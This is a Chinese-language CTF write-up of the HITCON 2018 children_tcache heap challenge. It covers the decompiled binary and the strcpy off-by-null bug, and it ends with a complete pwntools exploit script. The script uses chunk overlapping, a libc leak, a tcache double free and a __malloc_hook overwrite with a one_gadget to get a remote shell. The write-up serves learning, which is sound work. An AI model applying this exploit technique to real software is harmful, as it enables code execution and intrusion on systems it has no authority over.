# hitcon_2018_children_tcache

[题目地址](https://buuoj.cn/challenges#hitcon_2018_children_tcache)

这题加了个干扰项就把我看迷糊了。

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

全开，但毫无影响，毕竟你开不开我都做不出来堆题。

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  unsigned __int64 v3; // rax

  sub_AEB(a1, a2, a3);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v3 = sub_B67();
      if ( v3 != 2 )
        break;
      show();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        delete();
      }
      else
      {
        if ( v3 == 4 )
          _exit(0);
LABEL_13:
        puts("Invalid Choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      new();
    }
  }
}
```

就3个选项，一个一个看吧。

```c
unsigned __int64 new()
{
  int i; // [rsp+Ch] [rbp-2034h]
  char *dest; // [rsp+10h] [rbp-2030h]
  unsigned __int64 size; // [rsp+18h] [rbp-2028h]
  char s[8216]; // [rsp+20h] [rbp-2020h] BYREF
  unsigned __int64 v5; // [rsp+2038h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(s, 0, 0x2010uLL);
  for ( i = 0; ; ++i )
  {
    if ( i > 9 )
    {
      puts(":(");
      return __readfsqword(0x28u) ^ v5;
    }
    if ( !heap[i] )
      break;
  }
  printf("Size:");
  size = sub_B67();
  if ( size > 0x2000 )
    exit(-2);
  dest = (char *)malloc(size);
  if ( !dest )
    exit(-1);
  printf("Data:");
  sub_BC8(s, (unsigned int)size);
  strcpy(dest, s);                              // off-by-null
  heap[i] = dest;
  qword_2020C0[i] = size;                       // size记录在堆块地址后4个字节，这题没啥用，也没有edit选项
  return __readfsqword(0x28u) ^ v5;
}
```

这个off-by-null我当时没看出来，查了[wp](https://blog.csdn.net/weixin_44145820/article/details/105433911)才知道，说是“读取内容的时候会把内容从缓冲区用strcpy复制到堆上，因此有一个null-byte-one漏洞”。又去查了一下，找到了另一篇[文章](https://lantern.cool/note-pwn-off-by-one/#%E7%A4%BA%E4%BE%8B2)。原因是strcpy 在复制字符串时会拷贝结束符 '\x00'，比如原字符串长8，strcpy会连着末尾的\x00一起拷贝到目标地址，也就是9个字符，off-by-null。

```c
int show()
{
  __int64 v0; // rax
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v2 = sub_B67();
  if ( v2 > 9 )
    exit(-3);
  v0 = heap[v2];
  if ( v0 )
    LODWORD(v0) = puts((const char *)heap[v2]);
  return v0;
}
```

show就很正常，根据输入的索引从heap数组取得heap地址，puts输出。

```c
int delete()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v1 = sub_B67();
  if ( v1 > 9 )
    exit(-3);
  if ( heap[v1] )
  {
    memset((void *)heap[v1], '\xDA', qword_2020C0[v1]);// 注意此处，会把free的空间全部用\xDA填满
    free((void *)heap[v1]);
    heap[v1] = 0LL;
    qword_2020C0[v1] = 0LL;
  }
  return puts(":)");
}
```

delete也很正常，无uaf,还有个坑点，后面再说。看刚才的wp没看懂，又去搜了[一篇](https://xz.aliyun.com/t/4102#toc-6)。总体思路是tcache double free，但是由于没有uaf，需要绕个大圈子，利用off by null实现chunk overlapping，使两个申请到的堆块都是同一个堆块，完成tcache double free。exp如下。

```python
from pwn import *
r = remote("node4.buuoj.cn", 28175)
context.log_level = 'debug'

def add(size, content):
	r.recvuntil("Your choice: ")
	r.sendline('1')
	r.recvuntil("Size:")
	r.sendline(str(size))
	r.recvuntil("Data:")
	r.send(content)

def delete(index):
	r.recvuntil("Your choice: ")
	r.sendline('3')
	r.recvuntil("Index:")
	r.sendline(str(index))

def show(index):
	r.recvuntil("Your choice: ")
	r.sendline('2')
	r.recvuntil("Index:")
	r.sendline(str(index))
add(0x500, 'a'*0x4ff) #chunk0需要unsorted bin范围
add(0x68, 'a'*0x67) #chunk1 tcache范围
add(0x5f0, 'a'*0x5ef) #chunk2也需要unsorted bin范围，且低八位需要为0（这里我觉得是chunk2的prev_size与chunk1的data区域重叠的意思，这种情况下chunk2的prev_size域会被用作chunk1的data域）
add(0x20, 'a'*0x20) #防止攻击时上述chunk与top chunk合并
delete(1)
delete(0) #free掉chunk1、0。注意free chunk1时，chunk1的data域全部被\xDA填满，下面就是要处理这一点

for i in range(9):
    add(0x68 - i, 'b' * (0x68 - i)) #每次add都会执行strcpy，溢出一个空字节。第一次溢出的空字节将chunk2的size域的第一字节覆盖为\x00，剩下的次数用于将chunk1被\xDA填满的data域恢复到\x00
    delete(0) #用完就扔，循环清理

add(0x68, b'b'*0x60+p64(0x580)) #这里申请到的chunk还在chunk1的位置，chunk2的上面。b'b'*0x60填充，p64(0x580)伪造chunk2的prev_size。0x580是chunk1+chunk0的大小，0x500+0x68=0x568，16字节对齐是0x500+0x70=0x570，还要再多16字节给chunk头。0x570+0x10=0x580
delete(2) #触发unlink，现在系统认为chunk0+chunk1+chunk2是一整个大chunk
add(0x508, 'a'*0x507) #申请一个chunk，这个chunk会从刚才的大chunk中切割出来，剩下的部分归入unsorted bin，fd就有了main_arena的相关地址。剩下堆块0x570-0x508=0x68

show(0) #fd对应着chunk0的data域，show(0)泄露地址
malloc_hook = u64(r.recvuntil('\x7f').ljust(8, b'\x00')) - 0x60 -0x10
libc_base = malloc_hook - 4111408
one_gadget = libc_base + 0x4f322

add(0x68,'b'*0x67) #此处申请到的堆块索引2，是刚才切割堆块剩下的部分，地址和0号堆块一样
delete(0)
delete(2) #这里free chunk0、2，其实free的是同一个地址，double free
add(0x68, p64(malloc_hook)) #改fd
add(0x68,'b'*0x67) #取出剩余堆块
add(0x68,p64(one_gadget)) #得到malloc_hook地址处堆块，写入one_gadget

r.recvuntil("Your choice: ")
r.sendline('1')
r.recvuntil("Size:")
r.sendline('10')
r.interactive()
```